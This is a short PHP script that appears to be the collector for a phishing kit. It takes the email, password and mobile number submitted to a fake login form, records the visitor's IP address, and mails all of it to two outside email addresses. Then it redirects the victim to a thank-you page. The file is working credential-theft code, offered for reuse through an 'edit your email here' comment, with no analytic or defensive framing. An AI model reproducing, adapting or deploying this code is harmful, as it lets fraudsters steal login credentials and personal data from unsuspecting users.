<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "|----------| Make Good Funds  |--------------|\n";
$message .= "|eMail : ".$_POST['userid']."\n";
$message .= "|PasSword : ".$_POST['pass']."\n";
$message .= "|Mobile : ".$_POST['formtext1']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "|----------- Fuck Felips --------------|\n";
//>> CHANGE YOUR EMAIL HERE<<
$send = "globalsecuritiesapex@gmail.com, super.micheal-brown@yandex.com";
$subject = "$country | $ip";
{
mail("$send", "$subject", $message);   
}
header("Location: thanks.html");
?>